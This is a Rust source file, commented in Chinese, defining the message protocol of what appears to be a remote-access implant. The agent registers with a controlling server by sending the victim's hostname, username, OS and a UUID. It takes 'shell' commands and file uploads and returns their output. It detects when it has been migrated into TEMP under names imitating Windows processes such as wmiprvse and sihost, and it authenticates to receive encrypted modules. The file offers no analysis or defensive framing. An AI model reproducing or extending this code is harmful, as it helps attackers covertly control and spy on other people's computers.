// 数据类型定义
//
// 定义系统中使用的所有消息协议和数据结构。
// 所有消息使用 JSON 格式进行序列化 and 反序列化。

use crate::error::Result;
use serde::{Deserialize, Serialize};

/// 消息包装器 - 用于区分不同类型的消息
#[derive(Serialize, Deserialize, Debug, Clone, PartialEq)]
pub struct MessageWrapper {
    pub msg_type: MessageType,
    pub payload: serde_json::Value,
}

/// 消息类型枚举
#[derive(Serialize, Deserialize, Debug, Clone, PartialEq)]
#[serde(rename_all = "lowercase")]
pub enum MessageType {
    /// 注册消息 - 客户端向服务端发送
    Register,
    /// 命令消息 - 服务端向客户端发送
    Command,
    /// 响应消息 - 客户端向服务端发送
    Response,
}

/// 注册消息载荷
#[derive(Serialize, Deserialize, Debug, Clone, PartialEq)]
pub struct RegisterPayload {
    /// 客户端唯一标识符 (UUID v4)
    pub uuid: String,
    /// 主机名
    pub hostname: String,
    /// 操作系统类型
    pub os: String,
    /// 处理器架构
    pub arch: String,
    /// 当前用户名
    pub username: String,
    /// 连接来源: "disk" (磁盘运行) 或 "memory" (内存迁移)
    #[serde(default = "default_source")]
    pub source: String,
    /// Per-build KDF salt (base64), so server module HMAC matches agent get_aes_key().
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub kdf_salt: Option<String>,
    /// HMAC-SHA256(session_key, seed-derived-domain||uuid) base64 — required by server.
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub reg_proof: Option<String>,
}

fn default_source() -> String {
    "disk".to_string()
}

/// 命令消息载荷
#[derive(Serialize, Deserialize, Debug, Clone, PartialEq)]
pub struct CommandPayload {
    /// 命令类型 (例如: "shell")
    pub command_type: String,
    /// 命令内容
    pub command_content: String,
    /// 目标路径（文件相关命令使用）
    #[serde(skip_serializing_if = "Option::is_none")]
    pub path: Option<String>,
    /// 额外数据（例如文件上传的 base64）
    #[serde(skip_serializing_if = "Option::is_none")]
    pub data: Option<String>,
    /// 请求 ID（可选）- 用于将响应映射到请求
    #[serde(skip_serializing_if = "Option::is_none")]
    pub req_id: Option<String>,
}

/// 响应消息载荷
#[derive(Serialize, Deserialize, Debug, Clone, PartialEq)]
pub struct ResponsePayload {
    /// 标准输出
    pub stdout: String,
    /// 标准错误输出
    pub stderr: String,
    /// 当前路径（文件相关命令可选）
    #[serde(skip_serializing_if = "Option::is_none")]
    pub path: Option<String>,
    /// 请求 ID（可选）- 回显服务端发送的 req_id
    #[serde(skip_serializing_if = "Option::is_none")]
    pub req_id: Option<String>,
}

/// 系统信息
#[derive(Debug, Clone)]
pub struct SystemInfo {
    pub uuid: String,
    pub hostname: String,
    pub os: String,
    pub arch: String,
    pub username: String,
    pub source: String,
}

impl SystemInfo {
    /// 收集系统信息
    pub fn collect() -> SystemInfo {
        let uuid = crate::utils::get_agent_uuid();

        #[cfg(target_os = "windows")]
        let hostname = std::env::var("COMPUTERNAME").unwrap_or_else(|_| "unknown_host".to_string());
        #[cfg(not(target_os = "windows"))]
        let hostname = std::env::var("HOSTNAME").unwrap_or_else(|_| "unknown_host".to_string());

        let os = std::env::consts::OS.to_string();
        let arch = std::env::consts::ARCH.to_string();

        #[cfg(target_os = "windows")]
        let username = std::env::var("USERNAME").unwrap_or_else(|_| "unknown_user".to_string());
        #[cfg(not(target_os = "windows"))]
        let username = std::env::var("USER").unwrap_or_else(|_| "unknown_user".to_string());

        // 检测连接来源：如果当前 exe 在 TEMP 目录中，说明是内存迁移产生的
        let source = Self::detect_source();

        SystemInfo {
            uuid,
            hostname,
            os,
            arch,
            username,
            source,
        }
    }

    /// 检测 agent 是从磁盘直接运行还是内存迁移产生的
    fn detect_source() -> String {
        if let Ok(exe_path) = std::env::current_exe() {
            let exe_str = exe_path.to_string_lossy().to_lowercase();
            let temp_dir = std::env::temp_dir().to_string_lossy().to_lowercase();

            // 如果 exe 路径在 TEMP 目录下，说明是迁移产生的
            if exe_str.starts_with(&temp_dir) {
                return "memory".to_string();
            }

            // 额外检查：常见的迁移伪装名
            let suspicious_names = ["securityhealthsystray", "wmiprvse", "sihost"];
            if let Some(file_name) = exe_path.file_stem() {
                let name = file_name.to_string_lossy().to_lowercase();
                if suspicious_names.iter().any(|s| name == *s) && exe_str.contains("temp") {
                    return "memory".to_string();
                }
            }
        }
        "disk".to_string()
    }

    /// 将系统信息转换为注册消息
    pub fn to_register_message(&self) -> MessageWrapper {
        // Report build KDF salt so server can pack modules with matching derive_module_key
        let salt = crate::config::get_encryption_salt();
        let kdf_salt = if salt.iter().any(|&b| b != 0) {
            Some(base64::Engine::encode(
                &base64::engine::general_purpose::STANDARD,
                &salt,
            ))
        } else {
            // Still send zeros as explicit salt for empty-salt builds
            Some(base64::Engine::encode(
                &base64::engine::general_purpose::STANDARD,
                &salt,
            ))
        };
        let session_key = crate::config::get_aes_key();
        let reg_proof = if session_key.len() == 32 {
            Some(crate::crypto::register_proof(&session_key, &self.uuid))
        } else {
            None
        };
        let payload = RegisterPayload {
            uuid: self.uuid.clone(),
            hostname: self.hostname.clone(),
            os: self.os.clone(),
            arch: self.arch.clone(),
            username: self.username.clone(),
            source: self.source.clone(),
            kdf_salt,
            reg_proof,
        };

        MessageWrapper {
            msg_type: MessageType::Register,
            payload: serde_json::to_value(&payload).unwrap_or(serde_json::Value::Null),
        }
    }
}

/// 命令执行结果
#[derive(Debug, Clone, serde::Serialize, serde::Deserialize)]
pub struct CommandResult {
    pub stdout: String,
    pub stderr: String,
    pub path: Option<String>,
    pub req_id: Option<String>,
}

impl CommandResult {
    /// 将命令执行结果转换为响应消息
    pub fn to_response_message(&self) -> MessageWrapper {
        let payload = ResponsePayload {
            stdout: self.stdout.clone(),
            stderr: self.stderr.clone(),
            path: self.path.clone(),
            req_id: self.req_id.clone(),
        };

        MessageWrapper {
            msg_type: MessageType::Response,
            payload: serde_json::to_value(&payload).unwrap_or(serde_json::Value::Null),
        }
    }

    /// 将执行结果包装在 Result 中返回
    pub fn to_response_message_wrapped(&self) -> Result<MessageWrapper> {
        Ok(self.to_response_message())
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_register_payload_serialization() {
        let payload = RegisterPayload {
            uuid: "550e8400-e29b-41d4-a716-446655440000".to_string(),
            hostname: "test-host".to_string(),
            os: "windows".to_string(),
            arch: "x86_64".to_string(),
            username: "testuser".to_string(),
            source: "test".to_string(),
            kdf_salt: None,
            reg_proof: Some("dGVzdA==".to_string()),
        };

        // 序列化
        let json = serde_json::to_string(&payload).unwrap();

        // 反序列化
        let deserialized: RegisterPayload = serde_json::from_str(&json).unwrap();

        // 验证 round-trip
        assert_eq!(payload, deserialized);
    }

    #[test]
    fn test_command_payload_serialization() {
        let payload = CommandPayload {
            command_type: "shell".to_string(),
            command_content: "echo hello".to_string(),
            path: None,
            data: None,
            req_id: Some("req-123".to_string()),
        };

        let json = serde_json::to_string(&payload).unwrap();
        let deserialized: CommandPayload = serde_json::from_str(&json).unwrap();

        assert_eq!(payload, deserialized);
    }

    #[test]
    fn test_response_payload_serialization() {
        let payload = ResponsePayload {
            stdout: "hello\n".to_string(),
            stderr: "".to_string(),
            path: None,
            req_id: Some("req-123".to_string()),
        };

        let json = serde_json::to_string(&payload).unwrap();
        let deserialized: ResponsePayload = serde_json::from_str(&json).unwrap();

        assert_eq!(payload, deserialized);
    }

    #[test]
    fn test_message_wrapper_serialization() {
        let register = RegisterPayload {
            uuid: "550e8400-e29b-41d4-a716-446655440000".to_string(),
            hostname: "test-host".to_string(),
            os: "windows".to_string(),
            arch: "x86_64".to_string(),
            username: "testuser".to_string(),
            source: "test".to_string(),
            kdf_salt: None,
            reg_proof: None,
        };

        let wrapper = MessageWrapper {
            msg_type: MessageType::Register,
            payload: serde_json::to_value(&register).unwrap(),
        };

        // 序列化
        let json = serde_json::to_string(&wrapper).unwrap();

        // 反序列化
        let deserialized: MessageWrapper = serde_json::from_str(&json).unwrap();

        // 验证消息类型
        assert_eq!(wrapper.msg_type, deserialized.msg_type);

        // 验证载荷可以被正确解析
        let payload: RegisterPayload = serde_json::from_value(deserialized.payload).unwrap();
        assert_eq!(register, payload);
    }

    #[test]
    fn test_invalid_message_does_not_panic() {
        // 测试无效 JSON 不会导致 panic
        let invalid_json = r#"{"msg_type": "invalid", "payload": null}"#;
        let result: std::result::Result<MessageWrapper, serde_json::Error> =
            serde_json::from_str(invalid_json);
        assert!(result.is_err());

        // 测试缺少字段不会导致 panic
        let incomplete_json = r#"{"msg_type": "register"}"#;
        let result: std::result::Result<MessageWrapper, serde_json::Error> =
            serde_json::from_str(incomplete_json);
        assert!(result.is_err());
    }

    #[test]
    fn test_system_info_to_register_message() {
        let sys_info = SystemInfo {
            uuid: "550e8400-e29b-41d4-a716-446655440000".to_string(),
            hostname: "test-host".to_string(),
            os: "windows".to_string(),
            arch: "x86_64".to_string(),
            username: "testuser".to_string(),
            source: "test".to_string(),
        };

        let msg = sys_info.to_register_message();

        assert_eq!(msg.msg_type, MessageType::Register);

        let payload: RegisterPayload = serde_json::from_value(msg.payload).unwrap();
        assert_eq!(payload.uuid, sys_info.uuid);
        assert_eq!(payload.hostname, sys_info.hostname);
        assert_eq!(payload.os, sys_info.os);
        assert_eq!(payload.username, sys_info.username);
    }

    #[test]
    fn test_command_result_to_response_message() {
        let result = CommandResult {
            stdout: "output".to_string(),
            stderr: "error".to_string(),
            path: None,
            req_id: Some("req-456".to_string()),
        };

        let msg = result.to_response_message();

        assert_eq!(msg.msg_type, MessageType::Response);

        let payload: ResponsePayload = serde_json::from_value(msg.payload).unwrap();
        assert_eq!(payload.stdout, result.stdout);
        assert_eq!(payload.stderr, result.stderr);
        assert_eq!(payload.req_id, result.req_id);
    }

    #[test]
    fn test_system_info_collect() {
        let info = SystemInfo::collect();

        // UUID 不应为空
        assert!(!info.uuid.is_empty());

        // 主机名不应为空
        assert!(!info.hostname.is_empty());

        // 操作系统不应为空
        assert!(!info.os.is_empty());

        // 用户名不应为空
        assert!(!info.username.is_empty());
    }

    #[test]
    fn test_uuid_format() {
        let info = SystemInfo::collect();

        // 验证 UUID 格式正确 (8-4-4-4-12 格式)
        let uuid_parts: Vec<&str> = info.uuid.split('-').collect();
        assert_eq!(uuid_parts.len(), 5);
        assert_eq!(uuid_parts[0].len(), 8);
        assert_eq!(uuid_parts[1].len(), 4);
        assert_eq!(uuid_parts[2].len(), 4);
        assert_eq!(uuid_parts[3].len(), 4);
        assert_eq!(uuid_parts[4].len(), 12);
    }
}
